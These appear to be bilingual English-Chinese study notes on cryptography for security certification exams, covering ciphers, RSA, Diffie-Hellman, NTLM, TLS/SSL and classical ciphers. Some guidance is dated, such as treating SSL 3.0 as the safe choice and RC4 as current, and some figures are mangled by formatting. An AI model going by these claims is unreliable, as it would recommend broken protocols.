code and cipher, technically, they aren’t interchangeable. There are important distinctions between the two concepts.
Codes, which are cryptographic systems of symbols that represent words or phrases, sometimes secret, but not necessarily meant to provide confidentiality.
- A common example of a code is the “10 system” of communications used by law enforcement agencies.
- Under this system, the sentence “I received your communication and understand the contents” is represented by the code phrase “10-4.” - This code is commonly known by the public, but it does provide for ease of communication.
- Some codes are secret. They may convey confidential information using a secret codebook where the meaning of the code is known only to the sender and recipient.
- example, a spy might transmit the sentence “The eagle has landed” to report the arrival of an enemy aircraft.
Ciphers, are always meant to hide the true meaning of a message.
- They use a variety of techniques to alter and/or rearrange the characters or
bits of a message to achieve confidentiality.
- Ciphers convert messages from plain text to ciphertext:
  - on a bit basis (a single digit of a binary code),
  - character basis (a single character of an ASCII message),
  - or block basis (a fixed-length segment of a message, usually expressed in number of bits).
- The following sections cover several common ciphers in use today.
An easy way to keep the difference between codes and ciphers straight is to remember that codes work on words and phrases whereas ciphers work on individual characters and bits.
Encryption
•
•
C = E(M).
◦ Cipher-text = encryption (plaintext)
Cryptosystems consists of 7 components:
◦ 1. The set of possible plaintexts
◦ 2. The set of possible ciphertexts
◦ 3. The set of encryption keys
◦ 4. The set of decryption keys
◦ 5. The correspondence between encryption keys and decryption keys
◦ 6. The encryption algorithm to use
◦ 7. The decryption algorithm to use - Example:
◦ k be an integer in the range [−22, +22].
◦ c be Latin alphabet (23 characters)
◦ s(c, k), circular shift by k of character c in the Latin alphabet.
▸ k > 0 shift is forward ▸ k < 0 shift is backward
- s(D, 3) = G, - s(R, −2) = P, - s(Z, 2) = B
- s(C, −3) = Z.
◦ s(x, e), e: encryption key.
◦ s(x, d), d: decryption key.
Encryption has two basic forms: symmetric encryption and asymmetric encryption.
Confusion and Diffusion
Cryptographic algorithms rely on two basic operations to obscure plaintext messages— confusion 混乱 and diffusion 扩散.
- Confusion: the relationship between the plain text and the key is so complicated that an attacker can’t merely continue altering the plain text and analyzing the resulting ciphertext to determine the key.
- Diffusion: a change in the plain text results in multiple changes spread throughout the ciphertext.
Example: a cryptographic algorithm that first performs a complex substitution (confusion) andthen uses transposition to rearrange the characters (diffusion) of the substituted ciphertext.
Modern Cryptography
Modern cryptosystems use computationally complex algorithms and long cryptographic keys to meet the cryptographic goals of confidentiality, integrity, authentication, and nonrepudiation.
3 types of algorithms commonly used today: - symmetric encryption algorithms,
- asymmetric encryption algorithms,
- hashing algorithms.
 Cryptographic Methods 24 Triple DES (3DES) - A follow-on implementation of DES.
- Depending on the specific variant, it uses either two or three keys instead of
the single key that DES uses.
- It also spins through the DES algorithm three times via what’s called multiple
encryption.
- Multiple encryption: can be performed in several different ways.
- The simplest method of multiple encryption is just to stack algorithms on top
of each other—
◦ taking plaintext, encrypting it with DES,
◦ then encrypting the first ciphertext with a different key,
◦ and then encrypting the second ciphertext with a third key.
◦ In reality, this technique is less effective than the technique that 3DES
uses, which is to encrypt with one key, then decrypt with a second,
and then encrypt with a third.
◦ This greatly increases the number of attempts needed to retrieve the key
and is a significant enhancement of security.
- The additional security comes with a price, however. It can take up to three
times longer to compute 3DES than to compute DES. However, the advances in memory and processing power in today’s electronics make this problem irrelevant in all devices except for very small low-power handhelds.
- The only weaknesses of 3DES:
◦ those that already exist in DES.
◦ Because different keys are used with the same algorithm, the effective key
length is longer than DES keyspace and this results in greater resistance to brute-force attack, making 3DES stronger than DES to a wide range of attacks.
◦ While 3DES has continued to be popular and is still widely supported, AES has taken over as the symmetric encryption standard.
▸ 当三重DES中所有的密钥都相同时，三重DES就等同于普通的 DES了。
▸ 这是因为在两步加密、解密之后，得到的就是最初的明文。 ▸ 因此，以前用DES加密的密文，就可以通过这种方式用三重
DES来进行解密，也就是说三重DES对DES具备向下兼容
性。
▸ 如果密钥1和密钥3使用相同的密钥，而密钥2使用不同的密钥
(也就是只使用两个DES密钥)，这种三重就称为DES- EDE2。密钥1、密钥2、密钥3全部使用不同的比特序列的三 重DES称为DES-EDE3。
▸ 三重DES现状:尽管3DES目前还被银行等机构使用，但其处理
       速度不高，而且在安全性方面也逐渐显现出了一些问题。
Advanced Encryption Standard (AES ) 進階加密标准
- Because of the advancement of technology and the progress being made in quickly retrieving DES keys, NIST put out a request for proposals for a new Advanced Encryption Standard (AES).
- It called for a block cipher using symmetric key cryptography and supporting key sizes of 128, 192, and 256 bits.
- After evaluation, NIST had five finalists:
◦ MARS IBM
◦ RC6 RSA
◦ Rijndael John Daemen and Vincent Rijmen
◦ Serpent Ross Anderson, Eli Biham, and Lars Knudsen
◦ Twofish Bruce Schneier, John Kelsey, Doug Whiting, David Wagner,
chris Hall, and Niels Ferguson
- In the fall of 2000, NIST picked Rijndael to be the new AES. It was chosen for
its overall security as well as its good performance on limited capacity devices. AES has three different standard key sizes, 128, 192, and 256, designated AES-128, AES-192, and AES-256 respectively.
- While no efficient attacks currently exist against AES, more time and analysis will tell if this standard can last as long as DES has.
- In the world of symmetric cryptography, AES is the current gold standard of algorithms. It is considered secure and is computationally efficient.
- AES采用的是Rijndael算法，Rijndel的分组⻓度为128比特，密钥⻓度可 以以32比特为单位在128比特到256比特的范围内进行选择(不过在 AES的规格中，密钥⻓度只有128、192和256比特三种)。
RC4
- RC is a general term for several ciphers all designed by Ron Rivest
- RC officially stands for Rivest Cipher.
- RC1, RC2, RC3, RC4, RC5, and RC6 are all ciphers in the series.
- RC1 and RC3 never made it to release, but RC2, RC4, RC5, and RC6 are all
working algorithms.
- RC4 was created before RC5 and RC6, but it differs in operation.
◦ RC4 is a stream cipher, works by enciphering the plaintext in a stream, bit by bit.
◦ This makes stream ciphers faster than block-mode ciphers. sometimes ten
times faster than DES.
◦ Stream ciphers accomplish this by performing a bitwise XOR with the
plaintext stream and a generated key stream.
◦ RC4 can use a key length of 8 to 2048 bits, though the most common
versions use 128-bit keys.
◦ The most vulnerable point of the encryption is the possibility of weak
keys.
◦ One key in 256 can generate bytes closely correlated with key bytes.
◦ Proper implementations of RC4 need to include weak key detection.
◦ RC4 is the most widely used stream cipher and is used in popular
protocols such as Transport Layer Security (TLS) and WEP/WPA.
Blowfish
- Blowfish was designed in 1994 by Bruce Schneier.
- It is a block-mode cipher using 64-bit blocks and a variable key length from
32 to 448 bits.
- It was designed to run quickly on 32-bit microprocessors and is optimized for
situations with few key changes.
- The only successful cryptanalysis to date against Blowfish has been against
variants that used reduced rounds. There does not seem to be a weakness in the full 16-round version.
Twofish
- Twofish was one of the five finalists in the AES competition.
- Like other AES entrants, it is a block cipher
- utilizing 128-bit blocks with a variable- length key of up to 256 bits.
- This algorithm is available for public use, and has proven to be secure.
- Twofish is an improvement over Blowfish in that it is less vulnerable to
certain classes of weak keys.
Asymmetric Encryption / public key cryptography
- Asymmetric cryptography is in many ways completely different than symmetric cryptography.
- the algorithms are built around hard to reverse math problems.
- The strength of these functions is very important: Because an attacker is likely to have access to the public key, he can run tests of known plaintext and produce ciphertext. This allows instant checking of guesses that are made about the keys of the algorithm.
- popular asymmetric protocols.
◦ RSA,
◦ Diffie-Hellman,
◦ elliptic curve cryptography (ECC) ◦ ElGamal
RSA (2048-bit)
- RSA is one of the first public key cryptosystems ever invented.
- RSA's inventors, Ron Rivest, Adi Shamir, and Leonard Adleman, was
published in 1977.
- This algorithm uses the product of two very large prime numbers and works
on the principle of difficulty in factoring such large numbers.
- It’s best to choose large prime numbers from 100 to 200 digits in length that
are equal in length.
- This is a simple method, but its security has withstood the test of more than 30
years of analysis.
- Considering the effectiveness of RSA’s security and the ability to have two
keys, why are symmetric encryption algorithms needed at all? The answer
is speed.
- RSA in software can be 100 times slower than DES, and in hardware it can be
even slower.
- RSA can be used to perform both regular encryption and digital signatures.
- Digital signatures:
◦ try to duplicate the functionality of a physical signature on a document using encryption.
◦ Typically RSA and the other public key systems are used in conjunction with symmetric key cryptography.
◦ Public key, the slower protocol, is used to exchange the symmetric key (or shared secret), and then the communication uses the faster symmetric key protocol.
◦ This process is known as electronic key exchange.
- RSA的加密和解密
◦ 加密:ciphertext = plaintext^E次方 mod N (RSA加密)
◦ 解密:plaintext = ciphertext^D次方 mod N (RSA解密) - RSA的算法 ◦ 求N:
▸ 选择两个大的质数p和q(p和q不能相差太大) ▸ P和q不能被attacker知道
▸ 计算乘积:N = pq
◦ L(Least Common Multiple)最小公倍数:
▸ L这个数在RSA的加密和解密过程中都不出现，它只出现在生成
密钥对的过程中:
▸ L = lcm(p-1,q-1) (L是p-1和q-1的最小公倍数)
◦ E(gcd)最大公约数:
▸ 选择大于1小于L的随机整数E，且E和L的最大公约数为1，即E
和L互质: ▸ 1 < E< L
▸ gcd(E,L) = 1 (E和L的最大公约数为1) ◦ 求D。
▸ D是由数E计算得到的，
▸ D、E和L之间必须具备下列关系:1 < D < L
▸ E x D mod L = 1 【DxE除以L余数=1】
▸ ExD/L 余数 = 1
- 对于RSA来说，质数p和q不能被密码破译者知道。把p和q交给密码破译 者与把私钥交给密码破译者是等价的。因为由N求p和q只能通过将N 进行质因数分解来完成，所以一旦发现了对大整数进行质因数分解 的高效算法，RSA就能够被破译。
- 40=2*2*2*5 30=2*3*5 最大公约数:两个式子中都有一个2和5,所有最大公约数就是2*5=10.
最小公倍数:2和5只取一次,其他还有2、2和3;所有最小公倍数是 2*5*2*2*3=120.
- a mod b=c: a除以b余数为c
Diffie-Hellman - DH (2048-bit)
- Diffie-Hellman was created in 1976 by Whitfield Diffie and Martin Hellman.
- This protocol is one of the most common encryption protocols in use today. is the
gold standard for key exchange. Layer (SSL) protocol.
- It is also used by the SSH and IPsec protocols.
- Diffie-Hellman is important because it enables the sharing of a secret key
between two people who have not contacted each other before.
- There are several variants of the DH key exchange.
◦ Ephemeral Diffie- Hellman (EDH)
▸ a variant where a temporary key is used in the key exchange rather than reusing the same key over and over.
▸ This is done to create perfect forward secrecy
◦ Elliptic Curve Diffie-Hellman (ECDH)
▸ a variant of the Diffie-Hellman protocol that uses elliptic curve cryptography.
◦ Elliptic Curve Diffie-Hellman Ephemeral (ECDHE)
▸ When ECDH be used with ephemeral keys.
EXAM TIP , and for the exam, your should understand the subtle differences between
the forms, DH, EDH, ECDH, and ECDHE.
Elliptic curve cryptography (ECC) (224-bit)
- ECC is well suited for platforms with limited computing power. (like mobile
devices)
- The security of elliptic curve systems has been questioned, mostly because of lack of analysis.
- However, all public key systems rely on the difficulty of certain math problems.
- It would take a breakthrough in math for any of the mentioned systems to be
weakened dramatically, but research has been done about the problems and has shown that the elliptic curve problem has been more resistant to incremental advances.
- Again, as with all cryptography algorithms, only time will tell how secure they really are.
- The big benefit:
◦ they require less computing power for a given bit strength.
◦ ideal for use in low-power mobile devices.
◦ The surge in mobile connectivity has brought secure voice, e-mail, and
text applications that use ECC and AES algorithms to protect a user’s data.
- 过将椭圆上的特点点进行特殊的乘法运算来实现，它的特点是所需的密 钥⻓度比RSA短。 EIGamal
- RSA利用了质因数分解的难度，而EIGamal方式则利用了modN下求离散 对数的难度。
- 缺点就是经过加密的密文⻓度会变成明文的两倍。
- Asymmetric methods
◦ slower than symmetric methods
◦ not suitable for bulk encryption.
Cryptographic Applications
- A few applications can be used to encrypt data conveniently on your personal computer.
- These programs are representative of a wide range of stand-alone cryptographic applications.
- One noted exception to the list is TrueCrypt (a popular cryptographic application that ceased distribution in 2014 to much mystery and speculation. As it was apparently pulled by the development team, this program should no longer be relied upon for security. )
Pretty Good Privacy (PGP) 優良保密協定
- created by Philip Zimmermann in 1991, several versions, available for free under a noncommercial license.
- PGP is now a commercial enterprise encryption product.
- PGP can be applied to popular e-mail programs.
- One of the unique features of PGP is its use of both symmetric and
asymmetric encryption methods, accessing the strengths of each method
and avoiding the weaknesses of each as well.
◦ Symmetric keys are used for bulk encryption, taking advantage of the
speed and efficiency.
◦ The symmetric keys are passed using asymmetric methods, capitalizing
on the flexibility of this method.
- 是一个基于RSA公匙加密体系的邮件加密软件。可以用它对邮件保密以
防止非授权者阅读。能对邮件加上数字签名从而使收信人可以确认 邮件的发送者(确信邮件没有被篡改)。可以提供一种安全的通讯方 式，而事先并不需要任何保密的渠道用来传递密匙。它采用了一种 RSA和传统加密的杂合算法，用于数字签名的邮件文摘算法，加密 前压缩等，还有一个良好的人机工程设计。它的功能强大，有很快     的速度。而且它的源代码是免费的。
Gnu Privacy Guard (GnuPG/GPG)
- an open source
- implementation of the OpenPGP standard.
- is a public key encryption program
- designed to protect electronic communications such as e-mail.
- It operates similarly to PGP and includes a method for managing public/
private keys.
The Password Authentication Protocol (PAP) 密码认证协 议/
Challenge Handshake Authentication Protocol (CHAP)
- The Password Authentication Protocol (PAP)密码口令验证协议
◦ a plaintext authentication mechanism. 密码口令以明文发送，所以安全
性较低。
◦ Because it is a plaintext protocol, it really isn’t suited for authentication in today’s environment.
◦ PAP是两次握手认证协议，在链路首次初始化时，被认证端首先发起
     认证请求，向认证端发送用户名和密码信息进行身份认证。
- PAP has been replaced by Challenge Handshake Authentication Protocol (CHAP) 挑战握手认证协议
◦ which is designed to provide authentication periodically through the use of a challenge/response system (three-way handshake)
◦ providing a secure means of authentication.
◦ CHAP通过三次握手验证被认证端的身份，在初始链路建立时完成，
     为了提高安全性，在链路建立之后周期性进行验证。
◦ CHAP比PAP更安全，因为CHAP不在线路上发送明文，而是发送经
过MD5过的随机数序列。
NT LAN Manager (NTLM) protocol
- an authentication protocol designed by Microsoft for use with the Server Message Block (SMB) protocol.
- Server Message Block (SMB) protocol:
◦ an application-level network protocol
◦ used for sharing files and printers on Windows-based networks. - NTLM was designed as a replacement for the LAN MAN protocol.
- The current version is NTLM v2, which was introduced with NT 4.0 SP4.
- Although Microsoft has adopted the Kerberos protocol for authentication,
NTLMv2 is still used when
◦ Authenticating to a server using an IP address
◦ Authenticating to a server that belongs to a different Active Directory
forest
◦ Authenticating to a server that doesn’t belong to a domain 服务器没有加
入域
◦ When no Active Directory domain exists (“workgroup” or “peer-to-peer” connection)
◦ 客户端不支持Kerberos，，
◦ 或者用户是通过网络远程认证时，NTLM都非常有用。
- HMAC-MD5 is used in the NT LAN Manager version 2 challenge-response
protocol.
- 在允许的环境下，Kerberos是首选的认证方式。在这之前，Windows主要
采用 NTLM(NT Lan Manager)。
- NTLM使用在Windows NT和Windows 2000 Server(or later)工作组环境
中(Kerberos用在域模式下)。在AD域环境中，如果需要认证
Windows NT系统，也必须采用NTLM。
- 较之Kerberos，基于NTLM的认证过程要简单很多。
◦ NTLM采用一种质询/应答(Challenge/Response)消息交换模式。
◦ Bobby通过输入Windows帐号和密码登录客户端主机。在登录之前，
客户端会缓存输入密码的哈希值，原始密码会被丢弃(“原始密 码在任何情况下都不能被缓存”，基本安全准则)。成功登录客 户端Windows的用户如果试图访问服务器资源，需要向对方发送 一个请求。该请求中包含一个以明文表示的用户名。
◦ Application message(s):表示客户端和服务器之间发送的应用协议消 息。
◦ Application message [NTLM_NEGOTIATE]:当应用程序程序需要建 立认证会话的时候，NTLM协议就会被调用。客户端发送NTLM NEGOTIATE_MESSAGE消息到服务器。这个消息指定了该会话 期望的安全特性。
◦ Application message [NTLM_CHALLENGE]:服务器接收到请求后， 生成一个16位的随机数(Challenge或Nonce)。服务器发送 NTLM CHALLENGE_MESSAGE消息到客户端。该消息包括商 定的安全特性和服务器产生的随机数(Challenge)。(服务器保 存Challenge，Challenge是以明文的形式发送的)
◦ Application message [NTLM_AUTHENTICATE]:客户端接收到 Challenge，用在步骤一中保存的密码哈希值对其加密，将加密后 的Challenge发送给服务器。客户端向服务器发送NTLM AUTHENTICATE_MESSAGE消息。该消息包含用户名和 Response。这个Response可以证实客户端知道用户的密码。
◦ 服务器接收加密后的Challenge后，会验证这个Response。假如该用 户是本地账户，服务器可以根据本地账户数据库中的信息验证 Response。
◦ 假如该用户是域账户，服务器会将用户认证信息【用户名，服务器 发送给客户端的Challenge，客户端发送给服务器的Response(客 户端密码哈希值加密的Challenge)】发送给域控制器，由域控制 器验证该Response。
◦ 会向DC(Domain)发送针对客户端的验证请求。该请求主要包含以 下三方面的内容:客户端用户名;客户端密码哈希值加密的 Challenge和原始的Challenge。
◦ 这时候NTLM协议认证过程完成。
◦ DC根据用户名获取该帐号的密码哈希值，对原始的Challenge进行加
密。如果加密后的Challenge和服务器发送的一致，则意味着用户
     拥有正确的密码，验证通过，否则验证失败。
◦ DC将验证结果发给服务器，并最终反馈给客户端。
◦ Application message(s):如果Challenge和Response证明客户端知道用
     户密码，那么认证成功。假如认证失败，服务器可能会以某种方
     式发送认证失败的状态给应用协议，或者单纯的结束连接。
One-time Pads 一次性密钥
- One-time pads are an interesting form of encryption in that they theoretically are perfect and unbreakable.
- The plaintext is XOR’ed against the key producing the ciphertext.
- The key is the same size or larger than the material being encrypted. ◦ What makes the one-time pad “perfect” is the size of the key.
◦ use a keyspace full of keys, you will decrypt message of the same
length as the original,
◦ no way to discriminate which one is correct.
◦ This makes a one-time pad unable to be broken by even brute-force
methods(the key is not reused.)
◦ This makes a one-time pad less than practical for any mass use.
- 一次性密码本是古典密码学替换式加密方法的终极形态。凯撒密码，替 换密码，Vigener Cipher等共通弱点都是字母频率的不等，导致密钥 加密后密文中字母出现概率依旧不等，从而发现突破口。
- 而一次性密码本，使用与明文等⻓的密文使得所有字母的使用概率相 等，密文完全不揭示任何明文信息，使得任何唯密文攻击无效。而 在计算机领域则是bit位异或操作，隐藏ASCII码或者文件信息，具体 加密方式及解密方式证明如下:
- 实际应用中难点:
◦ 首先要共享一个和明文一样⻓度的Key，如果有方法绝对安全的共享
这个Key，那为什么不直接绝对安全的共享明文呢。
◦ 抛开第一条不说，一次性密码本也是有相应的攻击方式的，但有个
先决条件，就是一次性密码本2次或者多次使用。
Comparative Strengths and Performance of Algorithms
- There are several factors in determining the strength of a cryptographic algorithm.
- the size of the key: (First and most obvious) and the resulting keyspace.
◦ One method of attack is to simply try all of the possible keys in a brute-
force attack. - work factor:
◦ ◦ ◦
a subjective measurement of the time and effort needed to perform operations.
low work factor, the rate at which keys can be tested is high, meaning that larger keyspaces are needed.
Work factor also plays a role in protecting systems such as password hashes, where having a higher work factor can be part of the security mechanism.
Use of Algorithms/Protocols with Transport Encryption The movement of data across networks is referred to as transport. Encrypting transport mechanisms is one of the key elements in protecting data in motion. Data can be en- encrypted independent of the transport mechanism, and then passed over open channels, or the channel itself can be encrypted.
HTTPS
Most web activity occurs using the Hypertext Transfer Protocol (HTTP), but this plain- text protocol is prone to interception. HTTPS uses the Secure Sockets Layer (SSL) or Transport Layer Security (TLS) to secure the channel before the transfer of information. HTTPS uses the standard TCP port 443 for TCP/IP communications rather than the standard port 80 used for HTTP. Early HTTPS implementations made use of the 40-bit RC4 encryption algorithm, but with the relaxation of export restrictions, most imple- mentations now use 128-bit encryption. The appropriate set of algorithms is chosen from cipher suites during the SSL/TLS protocol negotiation.
SSL
Secure Sockets Layer (SSL) was invented by Netscape as a solution to the lack of con- fidentiality associated with web traffic. SSL works by encrypting the communication channel, beginning with a Diffie-Hellman key exchange and negotiating a set of param- eters that can include encryption and authentication methods. The current version of SSL is 3.0, and versions 2.0 and earlier have exploited flaws and should not be enabled.
TLS
Transport Layer Security (TLS) is an IETF creation that is very similar to SSL. TLS was created as a replacement for SSL, and in many cases when TLS is being used, people incorrectly refer to it as SSL. There are several versions of TLS, 1.0, 1.1, and 1.2. As with SSL, during the channel setup, the choice of algorithms is performed by choosing one of the cipher suites that both sides of the connection have in common.
IPsec
- IPsec is a collection of IP security features designed to introduce security at the network or packet-processing layer in network communication. Other approaches have attempted to incorporate security at higher levels of the TCP/IP suite, such as at the level where applications reside.
- IPsec is designed to be used to provide secure virtual private network (VPN) capability over the Internet. In essence, IPsec provides a secure version of the IP by introducing authentication and encryption to protect layer 4 protocols. IPsec is optional for IPv4 but is required for IPv6. Obviously, both ends of the communication need to use IPsec for the encryption/decryption process to occur. IPsec uses HMAC- SHA1 for integrity and authenticity and uses AES for confidentiality. - IPsec provides two types of security service to ensure authentication and confidentiality for either the data alone (referred to as IPsec transport mode) or for both the data and the header (referred to as tunnel mode). IPsec introduces several new protocols, including the Authentication Header (AH), which basically provides authentication of the sender, and the Encapsulating Security Payload (ESP), which adds encryption of the data to ensure confidentiality. IPsec also provides for payload compression before encryption using the IP Payload Compression Protocol (IPComp). Frequently, encryption negatively impacts the ability of compression algorithms to fully compress data for transmission. By providing the ability to compress the data before encryption, IPsec addresses this issue.
SSH
Secure Shell (SSH) is a secure replacement for Telnet, a plaintext transport protocol. OpenSSH is a popular SSH implementation, and the current version is 6.6. On the OpenSSH website (www.openssh.com/), a list of known vulnerabilities for past versions is presented. OpenSSH supports 3DES, Blowfish, and AES.
EXAM TIP For the exam, you should expect questions on transport encryption and HTTPS, SSL/TLS, IPsec, and SSH, all of which are CompTIA Security+ objectives.You should understand in which scenarios each is employed.
Cipher Suites
In many applications, the use of cryptography occurs as a collection of functions. Dif- ferent algorithms can be used for authentication, encryption/decryption, digital signa- ture, and hashing. The term cipher suite refers to an arranged group of algorithms. For instance, TLS has a published TLS Cipher Suite Registry at www.iana.org/ assignments/ tls-parameters/tls-parameters.xhtml.
Strong vs. Weak Ciphers
There is a wide range of ciphers, some old and some new, each with its own strengths and weaknesses. Over time, new methods and computational abilities change the viability of ciphers. The concept of strong versus weak ciphers is an acknowledgement that, over time, ciphers can become vulnerable to attacks. The application or selection of ciphers should take into consideration that not all ciphers are still strong. When selecting a cipher for use, it is important to make an appropriate choice. example, if a server offers SSL v2 and v3, you should choose v3 only, as v2 has been shown to be vulnerable.
Key Stretching
- mechanism that takes what would be weak keys and “stretches” them to make the system more secure against brute-force attacks.
- A typical methodology used for key stretching involves increasing the computational complexity by adding iterative rounds of computations. To extend a password to a longer length of key, you can run it through multiple rounds of variable-length hashing, each increasing the output by bits over time. This may take hundreds or thousands of rounds, but for single-use com- putations, the time is not significant. When one wants to use a brute- force attack, the increase in computational workload becomes significant when done billions of times, making this form of attack much more expensive.
- The common forms of key stretching employed in use today include Password- Based Key Derivation Function 2 and Bcrypt.
Cryptographic Keys
In the early days of cryptography, one of the predominant principles: “security through obscurity.”
the best way to keep an encryption algorithm secure, hide the details of the algorithm from outsiders.
Old cryptosystems required communicating parties to keep the algorithm used to encrypt and decrypt messages secret from third parties. Any disclosure of the algorithm could lead to compromise of the entire system by an adversary.
Modern cryptosystems do not rely on the secrecy of their algorithms.
In fact, the algorithms for most cryptographic systems are widely available for
public review in the accompanying literature and on the Internet.
Opening algorithms to public scrutiny actually improves their security.
Widespread analysis of algorithms by the computer security community allows practitioners to discover and correct potential security vulnerabilities and ensure that the algorithms they use to protect their communications are as secure as possible.
Instead of relying on secret algorithms, modern cryptosystems rely on the secrecy of one or more cryptographic keys used to personalize the algorithm for specific users or groups of users. - Example:
- transposition ciphers, a keyword is used with the columnar transposition to guide the encryption and decryption efforts.
- The algorithm used to perform columnar transposition is well known
- However, columnar transposition can be used to securely communicate between parties as long as a keyword is chosen that would not be guessed by an outsider.
- As long as the security of this keyword is maintained, it doesn’t matter that third parties know the details of the algorithm.
Although the public nature of the algorithm does not compromise the security of columnar transposition, the method does possess several inherent weaknesses that make it vulnerable to cryptanalysis. It is therefore an inadequate technology for use in modern secure communicat
One-time pads, the main strength of the one-time pad algorithm is derived from the extremely long key, at least as long as the message itself.
- Most modern cryptosystems do not use keys quite that long,
- but the length of the key is still an extremely important factor in determining the strength of the cryptosystem and the likelihood that the encryption will not be compromised through cryptanalytic techniques.
The rapid increase in computing power, it’s essential that you outpace adversaries by using sufficiently long keys that will defeat contemporary cryptanalysis efforts.
Additionally, if you want your data remain safe in the future, you must use keys that will outpace 赶过 the projected increase in cryptanalytic capability during the entire time period the data must be kept safe.
Several decades ago, when the Data Encryption Standard was created, a 56-bit key was considered sufficient to maintain the security of any data.
However, now the 56-bit DES algorithm is no longer secure because of advances in cryptanalysis techniques and supercomputing power.
Modern cryptographic systems use at least a 128-bit key to protect data against prying eyes.
the length of the key directly relates to the work function of the cryptosystem:
the longer the key, the harder it is to break the cryptosystem.
Comparison of symmetric and asymmetric cryptography systems
Key Requirements
symmetric cryptosystems require each pair of potential communicators have a
shared private key makes the algorithm nonscalable. The total number of keys: Number of Keys = n* (n − 1)/ 2
the larger the population, the less likely a symmetric cryptosystem will be suitable to meet its needs.
           Which Key Should I Use?
    If you’re new to public key cryptography, selecting the correct key for various applications can be quite confusing. Encryption, decryption, message signing, and signature verifica- tion all use the same algorithm with different key inputs. Here are a few simple rules to help keep these concepts straight in your mind when preparing for the CISSP exam:
If you want to encrypt a message, use the recipient’s public key.
If you want to decrypt a message sent to you, use your private key.
If you want to digitally sign a message you are sending to someone else, use your private key.
If you want to verify the signature on a message sent by someone else, use the sender’s public key.
  Symmetric Encryption shared-key, secret key, session-key cryptography.
- Faster
- both parties have a same/shared key to encrypt/decrypt packet during a session (session key).
- n parties wish to exchange encrypted messages with each other using
symmetric cryptosystem
  - a distinct secret key is needed for each pair of parties
  - total: n(n − 1)/2 keys
⁃
  - rise problem of key management.
- When large-sized keys are used, symmetric encryption is very difficult to
break. It is primarily employed to perform bulk encryption and provides only for the security service of confidentiality.
  The term private key can be tricky
- The term private key by itself always means the private key from the key
pair of public key cryptography (aka asymmetric).
- However, both private key cryptography and shared private key refer to symmetric cryptography.
Symmetric key cryptography weaknesses:
- Key distribution is major problem. Parties must have a secure method of exchanging the secret key before establishing communications with a symmetric key protocol. If a secure electronic channel is not available, an offline key distribution method must often be used (that is, out-of-band exchange).
- Symmetric key cryptography does not implement nonrepudiation. Because any communicating party can encrypt and decrypt messages with the shared secret key, there is no way to prove where a given message originated.
- The algorithm is not scalable. Extremely difficult for large groups to communicate using symmetric key cryptography. Secure private communication between individuals in the group could be achieved only if each possible combination of users shared a private key.
- Keys must be regenerated often. Each time a participant leaves the group, all keys known by that participant must be discarded.
The major strength:
- Symmetric key encryption is very fast, often 1,000 to 10,000 times faster than asymmetric algorithms.
- By nature of the mathematics involved, symmetric key cryptography also naturally lends itself to hardware implementations, creating the opportunity for even higher-speed operations. A substitution cipher replaces plaintext with ciphertext using a fixed system.
ROT13 (rotate 13 places) cipher
- substitution algorithm,
- but always uses a key of 13.
- Toencryptamessage,youwouldrotateeachletter13spaces.Todecrypta message, you would rotate each letter 13 spaces.
- the same algorithm and the same key
- it doesn’t provide true encryption but instead just obfuscates the data.
- Obfuscation 困惑 methods: attempt to make something unclear or difficult to understand. This is sometimes referred to as security through obscurity.
Symmetric encryption algorithms change keys much more often than once a day.
- if symmetric encryption always used the same key, it add vulnerabilities.
- First, when keys are reused, the encryption is easier to crack.
- Second, once the key is cracked, all data encrypted with this key is compromised.
Egyptian hieroglyphics 象形文字: the colorful and mysterious glyphs that cover walls and tombs of ancient Egypt can be considered a form of secret writing. (Substitution cipher)
Scytale: the spartans 斯巴达人 used this technique to send encoded messages to the front line. It used a rod of fixed diameter with a leather strap that was wrapped around it. when the strap was unwound, only the correct diameter rod can reveal the letter. (transposition cipher)
Caesar cipher
by Julius Caesar to communicate with Cicero in Rome while he was conquering Europe.
Simply shift each letter of the alphabet three places to the right. , modulo the alphabet size.
The Caesar cipher also known as the ROT3/Rotate 3 cipher or C3 cipher
  - the more general shift cipher uses the same algorithm to shift any number of characters desired by the user. example, the ROT12 cipher: turn an A into an M, a B into an N, and so on.
a substitution cipher that is monoalphabetic 单一字母.
This approach greatly increases the key space; hence, increasing the security of
the cryptosystem.
example, with English plaintexts, there are 26! possible substitution ciphers, that is, there are more than 4.03 × 1026 such ciphers.
You can express the ROT3 cipher in mathematical terms by converting each letter to its decimal equivalent (where A is 0 and Z is 25).
then add three to each plaintext letter to determine the ciphertext.
 The final encryption function for Caesar cipher is: C = (P + 3) mod 26 The decryption function is: P = (C - 3) mod 26
Simple substitution ciphers, substitute letters of the alphabet is easily broken. main weakness:
don’t hide the underlying frequencies of the different characters of a plaintext.
example:
  - the letter “E” occurs just over 12% of the time,
  - and letter “T.” occurs less than 10% of the time.
  - A similar table could have easily been constructed for any text or corpus written in any alphabet-based language.
 ⁃
American Civil War
Between the time of Caesar and the early years of the United States, scientists and mathematicians made significant advances beyond the early ciphers used by ancient civilizations.
During the American Civil War, Union and Confederate troops both used relatively advanced cryptographic systems to secretly communicate along the front lines because each side was tapping into the telegraph lines to spy on the other side.
These systems used complex combinations of word substitutions and transposition to defeat enemy decryption efforts. Another system used widely during the Civil War was a series of flag signals developed by army doctor Albert J. Myer.
Ultra vs. Enigma
Americans weren’t the only ones who expended significant resources in the pursuit of superior code-making machines.
World War II, the German military-industrial complex adapted a commercial code machine Enigma for government use.   - This machine used a series of three to six rotors to implement an extremely complicated substitution cipher.
- The only possible way to decrypt the message with contemporary technology was to use a similar machine with the same rotor settings used by the transmitting device.
- The Germans recognized the importance of safeguarding these devices and made it extremely difficult for the Allies to acquire one.
The Allied forces began a top-secret effort known by the code name Ultra to attack the Enigma codes. Eventually, their efforts paid off when the Polish military successfully reconstructed an Enigma prototype and shared their findings with British and American cryptology experts.
The Allies successfully broke the Enigma code in 1940, and historians credit this triumph 获胜 as playing a significant role in the eventual defeat of the Axis powers. The Japanese used a similar machine, Japanese Purple Machine, during World War II. A significant American attack on this cryptosystem and break the Japanese code at end of the war.
The Americans were aided by the fact that Japanese communicators used very formal message formats that resulted in a large amount of similar text in multiple messages, easing the cryptanalytic effort.
Concealment cipher
- The message is present but concealed in some way;
- example, the hidden message may be the first letter in each
sentence or every sixth word in a sentence.
  Polygraphic 印刷业 Substitution Ciphers and Substitution 替换 Boxes
groups of letters are encrypted together. example:
  - a plaintext could be partitioned into strings of two letters each, divided into digrams,
  - and each digram substituted with a different and unique other digram to create the ciphertext.
  - there are 262 = 676 possible English digrams
  - 676 possible keys for such an English digram substitution. substitution box / S-box: One way to express a digram substitution that is
easy to visualize is to use a two-dimensional table.
